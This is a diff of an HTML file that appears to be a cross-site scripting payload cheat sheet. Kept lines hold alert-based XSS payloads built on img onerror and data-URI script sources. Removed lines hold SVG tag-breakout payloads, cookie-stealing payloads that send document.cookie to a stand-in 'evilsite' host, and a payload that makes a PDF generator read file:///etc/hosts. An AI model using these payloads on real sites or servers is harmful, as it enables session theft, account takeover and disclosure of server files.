@@ -4,8 +4,7 @@
 	</head>
 	
 	<body>
-		<h1>[General XSS]
-<code>
+		<h1><i>[General XSS]</i></h1>
 	<img src=x onerror=alert("XSS Hurray")>
 
 	<script src=data:&comma;alert("SRC XSS")>
@@ -22,36 +21,10 @@
 			thr.send(null);"//x@x.com
 			
 			</code><--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
-		</h1>
+		
 
-	<h2> SVG 
 
-<xmp><p title="</xmp><svg/onload=alert("XMP")>">
-<noframes><p title="</noframes><svg/onload=alert("NOFRAMES")>"><iframe>
-	<p title="</iframe><svg/onload=alert("/IFRAMES")>">1'">
-		<img/src/onerror=.1|alert``>
-			</code>
-	</h2>
-	
-<h3>
-[Cookie Stealing]
-<code>
-<img src=x onerror=this.src='http://evilsite/?c='+document.cookie>
 
-	<strong>[With this, it will never end the loading of the page]</strong>
- 
-var xmlHttp = new XMLHttpRequest();
-xmlHttp.open('GET','https://evilsite/xmlreq?c='+document.cookie,true);
-xmlHttp.send(null);
-	
-	</code><h3>
 
-	<h4>[For PDF Generator, is important to wait for response]
-
-<code><script>var xmlHttp = new XMLHttpRequest();
-xmlHttp.onload=function(){  document.write('<p><font size="2">'+this.responseText+"</font></p>")};
-xmlHttp.open("GET","file:///etc/hosts");
-xmlHttp.send();
-	</script></code>
 </body>
 	</html>
